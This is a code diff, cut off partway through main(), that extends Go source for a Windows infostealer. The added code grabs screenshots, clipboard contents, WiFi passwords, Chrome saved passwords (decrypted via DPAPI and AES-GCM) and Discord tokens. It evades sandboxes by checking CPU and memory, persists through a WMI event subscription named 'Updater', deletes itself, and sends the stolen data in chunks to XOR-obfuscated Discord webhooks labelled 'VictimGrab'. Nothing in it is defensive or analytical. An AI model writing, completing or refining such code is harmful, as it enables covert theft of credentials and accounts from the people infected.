@@ -6,7 +6,6 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
-	"crypto/sha1"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
@@ -25,25 +24,41 @@ import (
 	"time"
 	"unsafe"
 
+	"database/sql"
+	_ "github.com/mattn/go-sqlite3"
 	"github.com/kbinani/screenshot"
-	"github.com/mattn/go-sqlite3"
-	"golang.org/x/crypto/pbkdf2"
 	"golang.org/x/sys/windows"
-	"golang.org/x/sys/windows/registry"
 )
 
-/* ... your xorDecrypt, encryptedWebhooks, getWebhooks unchanged ... */
+var encryptedWebhooks = [][]byte{
+	// Put your XOR-encrypted hooks here
+}
+
+func xorDecrypt(enc []byte, key byte) []byte {
+	dec := make([]byte, len(enc))
+	for i := range enc {
+		dec[i] = enc[i] ^ key
+	}
+	return dec
+}
+
+func getWebhooks(key byte) []string {
+	var hooks []string
+	for _, e := range encryptedWebhooks {
+		hooks = append(hooks, string(xorDecrypt(e, key)))
+	}
+	return hooks
+}
 
 func isVMOrSandbox() bool {
 	if runtime.NumCPU() < 4 {
 		return true
 	}
-	var mem windows.MemoryStatusEx
-	mem.Length = uint32(unsafe.Sizeof(mem))
-	if windows.GetPhysicallyInstalledSystemMemory(&mem.TotalPhys) == 0 || mem.TotalPhys < 4*1024*1024*1024 {
+	var totalMemKB uint64
+	err := windows.GetPhysicallyInstalledSystemMemory(&totalMemKB)
+	if err != nil || totalMemKB < 4*1024*1024 { // 4GB in KB
 		return true
 	}
-	// Add proc checks if you want
 	return false
 }
 
@@ -61,10 +76,9 @@ func takeScreenshot() string {
 }
 
 func getClipboard() string {
-	// Simple fallback using powershell if you don't want deps, but screenshot lib is better
-	cmd := exec.Command("powershell", "-Command", "Get-Clipboard")
+	cmd := exec.Command("powershell", "-Command", "Get-Clipboard -Raw")
 	out, _ := cmd.Output()
-	return string(out)
+	return strings.TrimSpace(string(out))
 }
 
 func getHostname() string {
@@ -72,7 +86,6 @@ func getHostname() string {
 	return h
 }
 
-// Bonus WiFi passwords
 func grabWiFi() []map[string]string {
 	var wifis []map[string]string
 	out, err := exec.Command("netsh", "wlan", "show", "profiles").Output()
@@ -86,9 +99,12 @@ func grabWiFi() []map[string]string {
 		if err != nil {
 			continue
 		}
-		key := regexp.MustCompile(`Key Content\s*:\s*(.*)`).FindStringSubmatch(string(out2))
-		if len(key) > 1 {
-			wifis = append(wifis, map[string]string{"ssid": name, "pass": strings.TrimSpace(key[1])})
+		keyMatch := regexp.MustCompile(`Key Content\s*:\s*(.*)`).FindStringSubmatch(string(out2))
+		if len(keyMatch) > 1 {
+			wifis = append(wifis, map[string]string{
+				"ssid": name,
+				"pass": strings.TrimSpace(keyMatch[1]),
+			})
 		}
 	}
 	return wifis
@@ -97,11 +113,11 @@ func grabWiFi() []map[string]string {
 func grabChromePasswords() []map[string]string {
 	var creds []map[string]string
 	appData := os.Getenv("LOCALAPPDATA")
-	localState := filepath.Join(appData, "Google", "Chrome", "User Data", "Local State")
-	loginDBs := []string{filepath.Join(appData, "Google", "Chrome", "User Data", "Default", "Login Data")}
-	// Add profiles if needed
+	localStatePath := filepath.Join(appData, "Google", "Chrome", "User Data", "Local State")
+	loginDBPath := filepath.Join(appData, "Google", "Chrome", "User Data", "Default", "Login Data")
 
-	data, err := ioutil.ReadFile(localState)
+	// Read master key
+	stateData, err := ioutil.ReadFile(localStatePath)
 	if err != nil {
 		return creds
 	}
@@ -110,59 +126,159 @@ func grabChromePasswords() []map[string]string {
 			EncryptedKey string `json:"encrypted_key"`
 		} `json:"os_crypt"`
 	}
-	json.Unmarshal(data, &state)
+	if json.Unmarshal(stateData, &state) != nil {
+		return creds
+	}
 	encKey, _ := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
-	encKey = encKey[5:] // remove DPAPI prefix
-	masterKey, err := windows.CryptUnprotectData(encKey, nil, nil, nil, 0)
+	encKey = encKey[5:] // strip "DPAPI" prefix
+
+	masterKey, err := windows.CryptUnprotectData(encKey, nil, nil, uintptr(0), nil, 0)
 	if err != nil {
 		return creds
 	}
 
-	for _, dbPath := range loginDBs {
-		if _, err := os.Stat(dbPath); os.IsNotExist(err) {
+	// Copy locked DB
+	tempDB := loginDBPath + ".tmp"
+	dbData, _ := ioutil.ReadFile(loginDBPath)
+	ioutil.WriteFile(tempDB, dbData, 0644)
+
+	db, err := sql.Open("sqlite3", tempDB)
+	if err != nil {
+		os.Remove(tempDB)
+		return creds
+	}
+	defer db.Close()
+	defer os.Remove(tempDB)
+
+	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
+	if err != nil {
+		return creds
+	}
+	defer rows.Close()
+
+	for rows.Next() {
+		var url, user string
+		var encPass []byte
+		rows.Scan(&url, &user, &encPass)
+
+		if len(encPass) < 15 || string(encPass[:3]) != "v10" && string(encPass[:3]) != "v11" {
 			continue
 		}
-		tmpDB := dbPath + ".tmp"
-		os.Copy(dbPath, tmpDB) // Chrome locks it
-		db, err := sql.Open("sqlite3", tmpDB)
+
+		nonce := encPass[3:15]
+		ciphertext := encPass[15 : len(encPass)-16]
+		tag := encPass[len(encPass)-16:]
+
+		block, _ := aes.NewCipher(masterKey)
+		aesgcm, _ := cipher.NewGCMWithNonceSize(block, 12)
+		plain, err := aesgcm.Open(nil, nonce, append(ciphertext, tag...), nil)
 		if err != nil {
 			continue
 		}
-		rows, _ := db.Query("SELECT origin_url, username_value, password_value FROM logins")
-		for rows.Next() {
-			var url, user string
-			var encPass []byte
-			rows.Scan(&url, &user, &encPass)
-			if len(encPass) > 0 && string(encPass[:3]) == "v10" || string(encPass[:3]) == "v11" {
-				nonce := encPass[3:15]
-				ciphertext := encPass[15 : len(encPass)-16]
-				tag := encPass[len(encPass)-16:]
-				block, _ := aes.NewCipher(masterKey)
-				aesgcm, _ := cipher.NewGCMWithNonceSize(block, 12)
-				plain, _ := aesgcm.Open(nil, nonce, append(ciphertext, tag...), nil)
-				creds = append(creds, map[string]string{
-					"url":      url,
-					"username": user,
-					"password": string(plain),
-				})
-			}
-		}
-		db.Close()
-		os.Remove(tmpDB)
+
+		creds = append(creds, map[string]string{
+			"url":      url,
+			"username": user,
+			"password": string(plain),
+		})
 	}
 	return creds
 }
 
-/* grabDiscordTokens unchanged - solid */
+func grabDiscordTokens() []string {
+	var tokens []string
+	appData := os.Getenv("APPDATA")
+	paths := []string{"discord", "discordcanary", "discordptb"}
+	re := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)
 
-/* addPersistence unchanged - WMI works */
+	for _, p := range paths {
+		leveldb := filepath.Join(appData, p, "Local Storage", "leveldb")
+		filepath.Walk(leveldb, func(path string, info os.FileInfo, err error) error {
+			if err != nil {
+				return nil
+			}
+			if strings.HasSuffix(path, ".ldb") || strings.HasSuffix(path, ".log") {
+				data, _ := ioutil.ReadFile(path)
+				matches := re.FindAllString(string(data), -1)
+				tokens = append(tokens, matches...)
+			}
+			return nil
+		})
+	}
 
-/* selfDelete, exfil, randInt unchanged */
+	seen := make(map[string]bool)
+	unique := []string{}
+	for _, t := range tokens {
+		if !seen[t] {
+			seen[t] = true
+			unique = append(unique, t)
+		}
+	}
+	return unique
+}
+
+func addPersistence() {
+	exe, _ := os.Executable()
+	cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`
+		$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{Name='Updater'; Query='SELECT * FROM Win32_VolumeChangeEvent'; QueryLanguage='WQL'};
+		$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{Name='Updater'; CommandLineTemplate='%s'};
+		Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{Filter=$filter; Consumer=$consumer}
+	`, exe))
+	cmd.Run()
+}
+
+func selfDelete() {
+	exe, _ := os.Executable()
+	go func() {
+		time.Sleep(5 * time.Minute)
+		exec.Command("cmd", "/C", "ping 127.0.0.1 -n 30 > nul & del", exe).Start()
+	}()
+}
+
+func exfil(data []byte, hooks []string) {
+	gz := new(bytes.Buffer)
+	w := gzip.NewWriter(gz)
+	w.Write(data)
+	w.Close()
+
+	chunkSize := 1900000
+	compressed := gz.Bytes()
+
+	for i := 0; i < len(compressed); i += chunkSize {
+		end := i + chunkSize
+		if end > len(compressed) {
+			end = len(compressed)
+		}
+		chunk := compressed[i:end]
+		b64 := base64.StdEncoding.EncodeToString(chunk)
+
+		payload := map[string]interface{}{
+			"username": "VictimGrab",
+			"embeds": []map[string]string{{
+				"description": "```" + b64 + "```",
+				"color":       "3447003",
+			}},
+		}
+		jsonPayload, _ := json.Marshal(payload)
+
+		for _, hook := range hooks {
+			time.Sleep(time.Duration(randInt(30, 180)) * time.Second)
+			http.Post(hook, "application/json", bytes.NewBuffer(jsonPayload))
+		}
+	}
+}
+
+func randInt(min, max int) int {
+	b := make([]byte, 4)
+	rand.Read(b)
+	return min + int(binary.LittleEndian.Uint32(b)%uint32(max-min))
+}
 
 func main() {
 	if isVMOrSandbox() {
 		os.Exit(0)
 	}
+
 	addPersistence()
 
 	info := map[string]interface{}{
